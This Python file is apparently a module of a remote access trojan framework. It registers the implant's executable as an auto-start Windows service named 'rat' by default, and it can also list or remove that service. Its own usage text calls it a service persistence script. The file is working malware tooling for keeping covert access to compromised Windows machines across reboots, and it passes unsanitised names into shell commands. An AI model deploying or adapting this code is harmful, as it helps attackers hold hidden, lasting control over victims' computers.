# exec win/persist/service.py --action create
# exec win/persist/service.py --action delete
# exec win/persist/service.py --action list --name MyService
# exec win/persist/service.py --action list

import subprocess

from core.utils.client_util import get_executable_path

# 默认配置
DEFAULT_NAME = 'rat'
EXECUTABLE_PATH = get_executable_path()


def service(action='list', name=None):
    """Windows 服务管理

    Args:
        action: create - 创建, delete - 删除, list - 查看
        name: 服务名称，默认 rat
    """
    if name is None:
        name = DEFAULT_NAME

    if action == 'list':
        # 检查指定服务是否存在
        result = subprocess.run(f'sc query "{name}"', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Service "{name}" exists')
            # 显示服务详情
            result = subprocess.run(f'sc qc "{name}"', shell=True, capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if line.strip():
                    print(f'  {line.strip()}')
        else:
            print(f'✗ Service "{name}" does not exist')
        return

    if action == 'delete':
        # 先停止服务再删除
        subprocess.run(f'sc stop "{name}"', shell=True, capture_output=True)
        result = subprocess.run(f'sc delete "{name}"', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Service "{name}" removed')
        else:
            print(f'✗ Failed to remove service "{name}": {result.stderr.strip()}')
        return

    if action == 'create':
        cmd = f'sc create "{name}" binpath="{EXECUTABLE_PATH}" start= auto'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Service "{name}" created')
            print(f'  Startup: Auto')
            print(f'  Binary: {EXECUTABLE_PATH}')
        else:
            print(f'✗ Failed to create service: {result.stderr.strip()}')
        return

    print(f'Unknown action: {action}')
    print_usage()


def print_usage():
    """打印使用说明"""
    print('\n' + '=' * 50)
    print('Windows Service Persistence Script')
    print('=' * 50)
    print('\nUsage:')
    print('  --action create               Create service (default name: rat)')
    print('  --action delete               Delete service (default name: rat)')
    print('  --action list                 Check if service exists (default name: rat)')
    print('  --action list --name MyService Check specific service')
    print('  --action create --name MyService Create with custom name')
    print('  --action delete --name MyService Delete with custom name')
    print('\nExamples:')
    print('  exec win/persist/service.py --action create')
    print('  exec win/persist/service.py --action list --name MyService')
    print('  exec win/persist/service.py --action delete --name MyService')
    print('=' * 50)


# 从 kwargs 获取参数
action = kwargs.get('action', 'list')
name = kwargs.get('name', None)

if action == 'help':
    print_usage()
else:
    service(action=action, name=name)